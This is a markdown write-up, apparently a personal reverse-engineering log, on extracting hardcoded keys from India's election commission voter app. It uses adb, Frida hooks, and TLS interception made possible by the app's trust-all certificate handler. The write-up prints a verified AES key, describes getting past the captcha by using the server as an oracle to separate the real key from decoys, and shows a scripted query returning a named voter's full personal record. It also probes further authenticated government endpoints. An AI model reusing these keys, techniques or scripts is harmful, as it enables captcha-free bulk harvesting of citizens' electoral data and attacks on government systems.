# Getting the app keys from the device (no login / no signup)

## Why no account is needed

The ECINET APK's keys are **app constants**, not account credentials. Every one
of them is produced by a `native` getter on `com.eci.citizen.BaseActivity` and
wrapped like this:

```smali
.method public getOfficialDetailSecureKey()Ljava/lang/String;
    ...
    invoke-direct {p0}, Lcom/eci/citizen/BaseActivity;->getNativeOfficialDetailSecureKey()Ljava/lang/String;
    ...
    invoke-static {v1, v2}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B
    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V
    return-object v0
.end method
```

i.e. `key = new String(Base64.decode(nativeConstant))`, and the native library is
`libnative_lib.so` (`System.loadLibrary("native_lib")` in `BaseActivity.<clinit>`).
Nothing here touches your voter account, so no login/OTP is required to read them
— you only need the binary (static) or one run of the app (dynamic).

Key inventory (same source): `getOfficialDetailSecureKey` (electoral-search
`passKey`), `getECISITEAPIKEY`, `getEciTechAPIKEY`, `getEepicHashNew`,
`getElectorDetailSecureKey`, `getElectorDetailEpic`, `getSveepAPIKEY`,
`getAuthenticationTokenCredentials`, `getElectionResultTokenKey`,
`getEvpApiSecureEci`, ...

## The catch on this APK copy

`C:\Users\rajku\Documents\eci rev eng\base.apk` is a **split install** base
module: it has no `lib/` directory at all (verified), so `libnative_lib.so` is
not inside it. The native code lives in the ABI split
(`split_config.arm64_v8a.apk` / `base__abi.apk`), which you can pull from the
device or from a mirror of the same version.

## Route A - pull the split from the device (no root)

```bash
adb shell pm path in.gov.eci.app
# -> package:/data/app/~~XXXX==/in.gov.eci.app-YYYY/base.apk
# -> package:/data/app/~~XXXX==/in.gov.eci.app-YYYY/split_config.arm64_v8a.apk

adb pull /data/app/~~XXXX==/in.gov.eci.app-YYYY/split_config.arm64_v8a.apk

# extract + scan for the Base64 constants:
python work/extract_native_key.py --apk split_config.arm64_v8a.apk
# or, if you already unpacked it:
python work/extract_native_key.py --so libnative_lib.so
```

`extract_native_key.py` finds the `getNative*` JNI names in the binary, harvests
Base64-looking tokens around them, decodes them, and writes
`work/out/native_keys.json`.

## Route B - hook the getters at runtime (root + frida-server)

```bash
adb push frida-server /data/local/tmp/ && adb shell "su -c '/data/local/tmp/frida-server &'"
frida -U -f in.gov.eci.app -l work/frida_grab_keys.js
```

Then open the Electoral Search / EEPIC screen. The script prints
`[KEY] com.eci.citizen.BaseActivity.getOfficialDetailSecureKey() = ...` for every
key getter that fires. This avoids fighting PAIRIP/obfuscation entirely.

Non-root alternative: run the app in an emulator (Google APIs image, not Play)
where `adb root` works, then use Frida or pull the split.

## Route C - watch the wire

The app accepts any TLS certificate (`ApiClient$1` is a no-op X509TrustManager +
permissive HostnameVerifier), so an interception proxy can capture traffic. The
pinned domains in `res/xml/network_security_config.xml` are
`encore.eci.gov.in`, `results.eci.gov.in`, `cvigil.eci.gov.in`,
`encoredemo.eci.gov.in`, `demo.eci.nic.in` - the electoral-search and
gateway hosts are not pinned, so a system CA is enough:

- look for the `X-API-KEY` / `Authorization` request headers, and the
  `passKey` query param on electoral-search calls.

## The two keys the APK's own EPIC search needs (no captcha)

`PollingStationSearchActivity.callSearchApiTrial()` builds its EPIC search like this:

```smali
iput-object v1, v0, ...TElasticSearchRequest;->epicNumber:Ljava/lang/String;   # YOUR EPIC
invoke-virtual {p0}, ...;->getTc()Ljava/lang/String;
invoke-static {v1, v2}, Lcom/eci/citizen/utility/KGn;->gPK(...)Ljava/lang/String;
iput-object v1, v0, ...TElasticSearchRequest;->sKey:Ljava/lang/String;          # securityKey
...
invoke-static {v1, v3}, Ldad/droid/lizz/AKgn;->encryptData([BLjava/security/PublicKey;)...
```

plus `getTExternal()` for the RSA public key.  `TElasticSearchRequest`'s
constructor hard-codes `captchaId="na"` and `captchaData="na"`, which is why the
APK never shows a captcha: the client-side `securityKey` is the authorization.

So the APK path needs exactly two native constants (both Base64 in
`libnative_lib.so`, no account):

| constant | getter | native JNI name | what it is |
|---|---|---|---|
| `tc` | `getTc()` | `getNTc` | Base64 AES key used by `KGn.gPK` |
| `external` | `getTExternal()` | `getNTExternal` | Base64 X.509/SPKI RSA public key |

Get them with either route above (they are on the `extract_native_key.py` JNI
list and hooked by `frida_grab_keys.js`), then:

```json
// work/app_keys.json
{ "tc": "...", "external": "..." }
```

```bash
python work/app_search.py selftest          # offline crypto round-trip
python work/app_search.py --epic TBG0342345 # real search, no captcha
```

### Decoys: `tc` MUST be verified, not guessed (learned the hard way)

`libnative_lib.so` ships **near-duplicate decoy strings** beside the real
constant (`kd8cf08abc5bd64a`, `ed8cf08edc5bd64a`, `kd8cf08abc5be59s`, ...) and its
`.text` is packed (entropy 7.77, the ARM64 bodies are encrypted at rest), so
there is **no static way** to tell which String the packing hides: proximity to
the `getNTc` symbol and "decodes to 16/24/32 bytes" both point at decoys.

Picking the first AES-shaped candidate silently produces HTTP 400 `[]` for
every EPIC - indistinguishable from "this voter is not in the roll".

The real check is the server itself:

```bash
python work/key_oracle.py --epic TBG0342345     # sweep every candidate
python work/device_bootstrap.py --from-apk work/out/device_splits/split_config.arm64_v8a.apk \
       --epic TBG0342345 --run                   # extract -> verify -> search
```

Why the server can be trusted as an oracle: an envelope sealed with a random RSA
key makes the gateway throw **500** (`An unexpected internal server error`),
while the extracted public key is accepted and a wrong `tc` yields **400 `[]`**;
a correct `tc` yields **200 with the record**. Verified values today:

| constant | value | provenance |
|---|---|---|
| `tc` | `P79vtNtk/WZaAXsQKCHClA` (AES-128 key `3fbf6fb4db64fd665a017b102821c294`) | `b64b64(UDc5dnROdGsvV1phQVhzUUtD)` in `libnative_lib.so`, verified live |
| `external` | 523-char Base64 SPKI (RSA-2048) | `libnative_lib.so`, accepted by the gateway |

An EPIC that is simply absent from the national display answers **200 `[]`**
(`SXQ2097129` does), so `[]` with a 200 is "no record", not a failed request.

## Status: SOLVED - EPIC in, voter record out

```bash
python work/epic_engine.py --epic TBG0342345 --search
```

```
EPIC TBG0342345  ->  HTTP 200, 1 record(s)
  Name            : urjana ramaiah
  Name (local)    : ఉర్జాన రామయ్య
  Relation        : narayana
  Age             : 51
  Gender          : M
  Assembly        : Ichchapuram
  Parliamentary   : Srikakulam
  District        : Srikakulam
  State           : Andhra Pradesh
  Part            : KEDARIPURAM
  Part No         : 2
  Serial No       : 16
  Polling station : M P U P SCHOOL, MIDDLE ROOM
  Address         : KEDARIPURAM
  Record id       : 22497143_TBG0342345_S01
  Active          : True
```

Cross-checked against the shipping app on the connected phone (`CPH2293`,
`in.gov.eci.app` v1.9.44): the on-screen Electoral Search result for the same
EPIC showed exactly these fields. `work/base.apk` is byte-identical to the
installed base module (`md5 e41b56b5f7a5677d44e20b6042c9598c`), so the smali this
engine was rebuilt from is the shipping code.

## Frontier notes (what else answers today)

- `electoralsearch.in` → 302 to the new portal `electoralsearch.eci.gov.in`;
  its certificate expired 2025-04-30 (the app only survives this because it
  ignores TLS validity).
- The **current public search** is `gateway-voters.eci.gov.in` with a captcha:
  use `work/portal_search.py` (captcha solved by a human).
- `gateway-vha.eci.gov.in/api/v1/eepic/*` and `/vh_epicno_verify` answer
  `401 Unauthorized, WWW-Authenticate: Bearer` without credentials — that is
  where `X-API-KEY` (from `libnative_lib.so`) is required.
- the APK's own route,
  `gateway-vha.eci.gov.in/api/v1/elastic/search-by-epic-from-national-display-v1`,
  is **live and reproduced** (see Status above). Details that matter on the
  wire: the route is rate-limited (`X-RateLimit-Burst-Capacity: 3`,
  `Replenish-Rate: 1`/s), a body the gateway cannot parse/unwrap answers `500`,
  a decoy `tc` answers `400 []`, and a hit answers `200` with the Elastic
  `content` document.

## After you have a key

Put it in `work/live_config.json`:

```json
{ "api_key": "<X-API-KEY>", "auth_proxy": "" }
```

and re-run:

```bash
python work/live_fetch.py --epic SXQ2097129 --probe-gateway
```

`live_fetch.py` sends `X-API-KEY` from that config on the Garuda probes.
